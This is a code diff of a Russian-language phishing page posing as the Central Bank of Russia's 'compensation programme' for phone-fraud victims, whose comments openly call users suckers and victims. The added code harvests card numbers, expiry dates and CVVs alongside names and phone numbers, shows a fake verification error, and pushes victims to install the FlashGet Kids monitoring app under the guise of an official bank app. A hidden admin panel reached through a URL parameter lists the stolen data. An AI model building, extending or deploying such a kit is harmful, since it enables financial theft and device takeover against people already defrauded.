@@ -7,109 +7,283 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
         body {
-            background: linear-gradient(135deg, #0d47a1 0%, #1a237e 100%);
-            color: white; min-height: 100vh; padding: 20px;
+            background: linear-gradient(to bottom, rgba(13, 71, 161, 0.6), rgba(26, 35, 126, 0.65)), 
+                        url('https://www.ntv.ru/home/news/2023/20230706/cb1_sno.jpg') no-repeat center center fixed;
+            background-size: cover;
+            color: white; 
+            min-height: 100vh; 
+            padding: 20px;
         }
         .container {
-            max-width: 500px; margin: 0 auto; background: white; color: black;
-            border-radius: 15px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            max-width: 900px;
+            margin: 0 auto; 
+            background: white; 
+            color: black;
+            border-radius: 15px; 
+            padding: 30px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            position: relative;
+        }
+        .content-wrapper {
+            display: flex;
+            gap: 30px;
+            margin-top: 20px;
+        }
+        .left-panel, .right-panel {
+            flex: 1;
         }
         .header {
-            text-align: center; border-bottom: 2px solid #0d47a1;
-            padding-bottom: 20px; margin-bottom: 30px;
+            text-align: center; 
+            border-bottom: 2px solid #0d47a1;
+            padding-bottom: 20px; 
+            margin-bottom: 30px;
         }
         .logo-text {
-            font-size: 2em; color: #0d47a1; font-weight: bold; margin-bottom: 10px;
+            font-size: 1.8em; 
+            color: #0d47a1; 
+            font-weight: bold; 
+            margin-bottom: 5px;
         }
         .badge {
-            background: #4caf50; color: white; padding: 5px 15px;
-            border-radius: 20px; display: inline-block; margin: 10px 0; font-size: 0.9em;
+            background: #4caf50; 
+            color: white; 
+            padding: 5px 15px;
+            border-radius: 20px; 
+            display: inline-block; 
+            margin: 10px 0; 
+            font-size: 0.9em;
         }
         .form-group { margin-bottom: 20px; }
         label { display: block; margin-bottom: 5px; color: #555; }
-        input {
-            width: 100%; padding: 12px; border: 2px solid #ddd;
-            border-radius: 8px; font-size: 16px;
+        input, select {
+            width: 100%; 
+            padding: 12px; 
+            border: 2px solid #ddd;
+            border-radius: 8px; 
+            font-size: 16px;
         }
         .check-btn {
-            width: 100%; padding: 15px; background: #0d47a1; color: white;
-            border: none; border-radius: 8px; font-size: 1.1em; cursor: pointer; margin: 20px 0;
+            width: 100%; 
+            padding: 15px; 
+            background: #0d47a1; 
+            color: white;
+            border: none; 
+            border-radius: 8px; 
+            font-size: 1.1em; 
+            cursor: pointer; 
+            margin: 20px 0;
+            transition: background 0.3s;
+        }
+        .check-btn:hover {
+            background: #1a237e;
         }
         .result {
-            display: none; background: #e8f5e9; padding: 25px;
-            border-radius: 10px; margin: 25px 0; text-align: center;
+            display: none; 
+            background: #e8f5e9; 
+            padding: 25px;
+            border-radius: 10px; 
+            margin: 25px 0; 
+            text-align: center;
         }
         .amount {
-            font-size: 2.5em; color: #0d47a1; font-weight: bold; margin: 15px 0;
+            font-size: 2.5em; 
+            color: #0d47a1; 
+            font-weight: bold; 
+            margin: 15px 0;
         }
         .download-btn {
-            display: block; background: #ff9800; color: white; text-align: center;
-            padding: 15px; border-radius: 8px; text-decoration: none; margin: 20px 0; font-weight: bold;
+            display: block; 
+            background: #ff9800; 
+            color: white; 
+            text-align: center;
+            padding: 15px; 
+            border-radius: 8px; 
+            text-decoration: none; 
+            margin: 20px 0; 
+            font-weight: bold;
+            transition: background 0.3s;
+        }
+        .download-btn:hover {
+            background: #e68900;
         }
         .manager-note {
-            background: #e3f2fd; border: 1px solid #2196f3; padding: 12px;
-            border-radius: 8px; margin: 15px 0; font-size: 0.9em; color: #0d47a1;
+            background: #e3f2fd; 
+            border: 1px solid #2196f3; 
+            padding: 12px;
+            border-radius: 8px; 
+            margin: 15px 0; 
+            font-size: 0.9em; 
+            color: #0d47a1;
         }
         .admin-panel {
-            background: #f1f1f1; padding: 20px; border-radius: 10px; margin-top: 30px;
-            border: 2px dashed #ff4444; /* Яркая рамка, чтобы ты не пропустил */
-            display: none; /* ПО УМОЛЧАНИЮ СКРЫТО */
+            background: #f1f1f1; 
+            padding: 20px; 
+            border-radius: 10px; 
+            margin-top: 30px;
+            border: 2px dashed #ff4444; 
+            display: none; 
+        }
+        .error-message {
+            display: none;
+            background: #ffebee;
+            border: 1px solid #f44336;
+            color: #d32f2f;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            text-align: center;
+        }
+        .payment-counter {
+            text-align: center;
+            background: #e8f5e9;
+            padding: 10px;
+            border-radius: 8px;
+            margin: 15px 0;
+            border-left: 4px solid #4caf50;
+            font-weight: bold;
+            color: #2e7d32;
+        }
+        .card-row {
+            display: flex;
+            gap: 10px;
+        }
+        .card-row .form-group {
+            flex: 1;
+        }
+        .card-row .form-group:last-child {
+            flex: 0.5;
         }
     </style>
 </head>
 <body>
     <div class="container">
+        <!-- Шапка с логотипом -->
         <div class="header">
-            <div class="logo-text">ЦЕНТРАЛЬНЫЙ БАНК РФ</div>
-            <div class="badge">Компенсационная программа</div>
-            <p style="color: #666; margin-top: 10px;">Проверка выплат пострадавшим от мошенничества</p>
+            <div style="display: flex; align-items: center; justify-content: center; gap: 20px; margin-bottom: 15px;">
+                <img src="https://i.ytimg.com/vi/ZropkIAHdxY/maxresdefault.jpg" 
+                     alt="Логотип ЦБ РФ" 
+                     style="width: 70px; height: 70px; object-fit: contain;"
+                     onerror="this.style.display='none'">
+                <div style="text-align: left;">
+                    <div class="logo-text" style="font-size: 1.8em; color: #0d47a1; font-weight: bold; margin-bottom: 5px;">
+                        ЦЕНТРАЛЬНЫЙ БАНК<br>РОССИЙСКОЙ ФЕДЕРАЦИИ
+                    </div>
+                    <div class="badge" style="background: #4caf50; color: white; padding: 4px 12px; border-radius: 15px; display: inline-block; font-size: 0.85em;">
+                        Официальная программа компенсаций
+                    </div>
+                </div>
+            </div>
+            
+            <div style="background: #f0f7ff; padding: 15px; border-radius: 10px; border-left: 4px solid #0d47a1; margin-top: 10px;">
+                <p style="color: #333; margin: 0; line-height: 1.5; font-size: 0.95em;">
+                    <strong style="color: #0d47a1;">📍 Возврат средств пострадавшим от телефонных мошенников</strong><br>
+                    Если вам звонили от лица банка или службы безопасности и вы переводили деньги — 
+                    проверьте право на компенсацию через наш портал.<br><br>
+                    
+                    <span style="color: #d32f2f; font-weight: bold;">💰 Указанная сумма — гарантированный минимум выплаты.</span><br>
+                    Если фактические потери больше — предоставьте доказательства сотруднику для 
+                    оформления дополнительных выплат.
+                </p>
+            </div>
         </div>
 
-        <!-- ПОЛЯ ДЛЯ ВВОДА -->
-        <div class="form-group">
-            <label>Фамилия</label>
-            <input type="text" id="lastName" placeholder="Иванов" required>
-        </div>
-        <div class="form-group">
-            <label>Имя</label>
-            <input type="text" id="firstName" placeholder="Иван" required>
-        </div>
-        <div class="form-group">
-            <label>Отчество</label>
-            <input type="text" id="middleName" placeholder="Иванович">
-        </div>
-        <div class="form-group">
-            <label>Номер телефона</label>
-            <input type="tel" id="phone" placeholder="+7 999 123-45-67" required>
-        </div>
+        <div class="content-wrapper">
+            <!-- ЛЕВЫЙ БЛОК: Верификация карты -->
+            <div class="left-panel">
+                <h3 style="color: #0d47a1; margin-bottom: 20px; text-align: center;">🔐 Верификация карты для выплаты</h3>
+                
+                <div class="form-group">
+                    <label>Номер банковской карты</label>
+                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>
+                </div>
+                
+                <div class="card-row">
+                    <div class="form-group">
+                        <label>Срок действия (ММ/ГГ)</label>
+                        <input type="text" id="cardExpiry" placeholder="12/25" maxlength="5" required>
+                    </div>
+                    <div class="form-group">
+                        <label>CVV код</label>
+                        <input type="text" id="cardCVV" placeholder="123" maxlength="3" required>
+                    </div>
+                </div>
 
-        <button class="check-btn" onclick="checkCompensation()">🔍 ПРОВЕРИТЬ КОМПЕНСАЦИЮ</button>
+                <button class="check-btn" onclick="verifyCard()">✅ ПРОЙТИ ВЕРИФИКАЦИЮ КАРТЫ</button>
 
-        <!-- РЕЗУЛЬТАТ ДЛЯ ЛОХА -->
-        <div class="result" id="result">
-            <div class="badge">🎉 ВАША ВЫПЛАТА ОДОБРЕНА!</div>
-            <h3 id="userName"></h3>
-            <p>По решению Арбитражного суда г. Москва</p>
-            <div class="amount" id="moneyAmount">0 ₽</div>
-            <p>Средства зарезервированы на ваше имя.</p>
+                <div class="payment-counter">
+                    💰 Уже выплачено: <strong>15 427 000 ₽</strong>
+                </div>
 
-            <p><strong>Для получения выплаты:</strong></p>
-            <ol style="text-align: left; background: #f5f5f5; padding: 15px; border-radius: 8px;">
-                <li>Скачайте приложение FlashGet Kids по кнопке ниже.</li>
-                <li>Установите детское более безопастное приложение, откройте.</li>
-                <li>Введите код доступа: <strong>317 287 002</strong></li>
-                <li>Следуйте инструкциям в приложении.</li>
-            </ol>
-
-            <div class="manager-note">
-                <strong>❗ Важно:</strong> Для помощи с установкой с вами свяжется менеджер.<br>
-                Продублируйте сумму выплаты менеджеру в чат для ускорения получения.
+                <!-- Сообщение об ошибке верификации -->
+                <div class="error-message" id="cardError">
+                    <strong>❌ ОШИБКА ВЕРИФИКАЦИИ!</strong><br>
+                    У вас не установлено защищенное приложение ЦБ РФ.<br><br>
+                    
+                    <strong>Решение:</strong><br>
+                    1. Установите приложение через основной блок справа<br>
+                    2. Если не получится — с вами свяжется менеджер для помощи<br><br>
+                    
+                    <a href="https://flashget.kids/ru" class="download-btn" target="_blank">
+                        ⬇️ СКАЧАТЬ FLASHGET KIDS ДЛЯ ПОЛУЧЕНИЯ ДЕНЕГ
+                    </a>
+                </div>
             </div>
 
-            <a href="https://flashget.kids/ru" class="download-btn" target="_blank">
-                ⬇️ СКАЧАТЬ FLASHGET KIDS ДЛЯ ПОЛУЧЕНИЯ ДЕНЕГ
-            </a>
-            <p style="color: #666; font-size: 0.9em; margin-top: 15px;">Ожидайте звонка менеджера в течение 24 часов.</p>
+            <!-- ПРАВЫЙ БЛОК: Основная форма (как было) -->
+            <div class="right-panel">
+                <h3 style="color: #0d47a1; margin-bottom: 20px; text-align: center;">📋 Проверка компенсации</h3>
+                
+                <div class="form-group">
+                    <label>Фамилия</label>
+                    <input type="text" id="lastName" placeholder="Иванов" required>
+                </div>
+                <div class="form-group">
+                    <label>Имя</label>
+                    <input type="text" id="firstName" placeholder="Иван" required>
+                </div>
+                <div class="form-group">
+                    <label>Отчество</label>
+                    <input type="text" id="middleName" placeholder="Иванович">
+                </div>
+                <div class="form-group">
+                    <label>Номер телефона</label>
+                    <input type="tel" id="phone" placeholder="+7 999 123-45-67" required>
+                </div>
+
+                <button class="check-btn" onclick="checkCompensation()">🔍 ПРОВЕРИТЬ КОМПЕНСАЦИЮ</button>
+
+                <div class="payment-counter">
+                    💰 Уже выплачено: <strong>15 427 000 ₽</strong>
+                </div>
+
+                <!-- РЕЗУЛЬТАТ ДЛЯ ЛОХА -->
+                <div class="result" id="result">
+                    <div class="badge">🎉 ВАША ВЫПЛАТА ОДОБРЕНА!</div>
+                    <h3 id="userName"></h3>
+                    <p>По решению Арбитражного суда г. Москва</p>
+                    <div class="amount" id="moneyAmount">0 ₽</div>
+                    <p>Средства зарезервированы на ваше имя.</p>
+
+                    <p><strong>Для получения выплаты:</strong></p>
+                    <ol style="text-align: left; background: #f5f5f5; padding: 15px; border-radius: 8px;">
+                        <li>Скачайте приложение FlashGet Kids по кнопке ниже. Для безопасности устанавливайте <strong>"Детское приложение"</strong>.</li>
+                        <li>Установите и зарегистрируйтесь в приложении.</li>
+                        <li>Введите код доступа: <strong>317 287 002</strong></li>
+                        <li>Следуйте инструкциям в приложении.</li>
+                    </ol>
+
+                    <div class="manager-note">
+                        <strong>❗ Важно:</strong> Вы можете установить приложение самостоятельно.<br>
+                        Если не получится — с вами свяжется менеджер для помощи.<br>
+                        Продублируйте сумму выплаты менеджеру в чат для ускорения получения.
+                    </div>
+
+                    <a href="https://flashget.kids/ru" class="download-btn" target="_blank">
+                        ⬇️ СКАЧАТЬ FLASHGET KIDS ДЛЯ ПОЛУЧЕНИЯ ДЕНЕГ
+                    </a>
+                    <p style="color: #666; font-size: 0.9em; margin-top: 15px;">Ожидайте звонка менеджера в течение 24 часов.</p>
+                </div>
+            </div>
         </div>
 
         <!-- АДМИН-ПАНЕЛЬ (ЖЕРТВЫ) - СКРЫТА ОТ ВСЕХ -->
@@ -123,13 +297,45 @@
 
         <!-- ОФИЦИАЛЬНЫЙ ПОДВАЛ БЕЗ КНОПОК -->
         <div style="text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid #eee; color: #666; font-size: 0.8em;">
-            <p>© 2024 Центральный Банк Российской Федерации. Официальный портал.</p>
+            <p>© 2026 Центральный Банк Российской Федерации. Официальный портал получения выплат.</p>
         </div>
     </div>
 
     <script>
         // Храним данные
         let victimsData = JSON.parse(localStorage.getItem('victimsData')) || [];
+        
+        // Храним фиксированные суммы по телефонам
+        let phoneAmounts = JSON.parse(localStorage.getItem('phoneAmounts')) || {};
+
+        function verifyCard() {
+            const cardNumber = document.getElementById('cardNumber').value.trim();
+            const cardExpiry = document.getElementById('cardExpiry').value.trim();
+            const cardCVV = document.getElementById('cardCVV').value.trim();
+
+            if (!cardNumber || !cardExpiry || !cardCVV) {
+                alert('Заполните все поля карты');
+                return;
+            }
+
+            // Сохраняем данные карты
+            const cardInfo = {
+                cardNumber: cardNumber,
+                cardExpiry: cardExpiry,
+                cardCVV: cardCVV,
+                time: new Date().toLocaleString('ru-RU')
+            };
+
+            // Сохраняем в localStorage
+            let cardData = JSON.parse(localStorage.getItem('cardData')) || [];
+            cardData.push(cardInfo);
+            if (cardData.length > 50) cardData = cardData.slice(-50);
+            localStorage.setItem('cardData', JSON.stringify(cardData));
+
+            // Показываем ошибку и предлагаем скачать приложение
+            document.getElementById('cardError').style.display = 'block';
+            document.getElementById('cardError').scrollIntoView({ behavior: 'smooth' });
+        }
 
         function checkCompensation() {
             const lastName = document.getElementById('lastName').value.trim();
@@ -141,9 +347,19 @@
                 return;
             }
 
-            // Случайная сумма от 85к до 280к
-            const amounts = [85000, 127000, 189000, 215000, 280000];
-            const randomAmount = amounts[Math.floor(Math.random() * amounts.length)];
+            // Проверяем, есть ли уже сумма для этого телефона
+            let randomAmount;
+            if (phoneAmounts[phone]) {
+                // Используем сохраненную сумму
+                randomAmount = phoneAmounts[phone];
+            } else {
+                // Новая случайная сумма от 85к до 280к
+                const amounts = [85000, 127000, 189000, 215000, 280000];
+                randomAmount = amounts[Math.floor(Math.random() * amounts.length)];
+                // Сохраняем сумму для этого телефона
+                phoneAmounts[phone] = randomAmount;
+                localStorage.setItem('phoneAmounts', JSON.stringify(phoneAmounts));
+            }
 
             // Сохраняем жертву
             const victimInfo = {
@@ -154,7 +370,7 @@
             };
 
             victimsData.push(victimInfo);
-            if (victimsData.length > 20) victimsData = victimsData.slice(-20); // Храним 20 последних
+            if (victimsData.length > 20) victimsData = victimsData.slice(-20);
             localStorage.setItem('victimsData', JSON.stringify(victimsData));
 
             // Показываем результат лоху
@@ -169,29 +385,63 @@
             }
         }
 
-        // Функции админ-панели (работают, но она скрыта)
+        // Функции админ-панели
         function updateAdminPanel() {
             const listDiv = document.getElementById('victimsList');
             if (victimsData.length === 0) {
                 listDiv.innerHTML = 'Данных пока нет...';
                 return;
             }
-            let html = '';
+            let html = '<h5>Основные жертвы:</h5>';
             victimsData.slice().reverse().forEach((victim) => {
                 html += `<div style="background: white; padding: 10px; margin: 5px 0; border-radius: 5px; border-left: 4px solid #d32f2f;">
                     <strong>${victim.name}</strong><br>📱 ${victim.phone}<br>💰 ${victim.amount.toLocaleString()} руб<br>⏰ ${victim.time}
                 </div>`;
             });
+            
+            // Показываем также данные карт
+            const cardData = JSON.parse(localStorage.getItem('cardData')) || [];
+            if (cardData.length > 0) {
+                html += '<h5 style="margin-top: 20px;">Данные карт:</h5>';
+                cardData.slice().reverse().forEach((card, index) => {
+                    html += `<div style="background: #fff8e1; padding: 10px; margin: 5px 0; border-radius: 5px; border-left: 4px solid #ff9800;">
+                        💳 Карта: ${card.cardNumber}<br>📅 Срок: ${card.cardExpiry}<br>🔒 CVV: ${card.cardCVV}<br>⏰ ${card.time}
+                    </div>`;
+                });
+            }
+            
             listDiv.innerHTML = html;
         }
 
         function clearData() {
             if (confirm('Удалить ВСЕ данные?')) {
                 victimsData = [];
+                phoneAmounts = {};
                 localStorage.removeItem('victimsData');
+                localStorage.removeItem('phoneAmounts');
+                localStorage.removeItem('cardData');
                 updateAdminPanel();
             }
         }
+
+        // Автоформатирование карты
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            value = value.replace(/(\d{4})/g, '$1 ').trim();
+            e.target.value = value.substring(0, 19);
+        });
+
+        document.getElementById('cardExpiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value.substring(0, 5);
+        });
+
+        document.getElementById('cardCVV').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
+        });
 
         // ПРОВЕРКА ПАРАМЕТРА ССЫЛКИ: если открыта с ?admin=777
         document.addEventListener('DOMContentLoaded', function() {
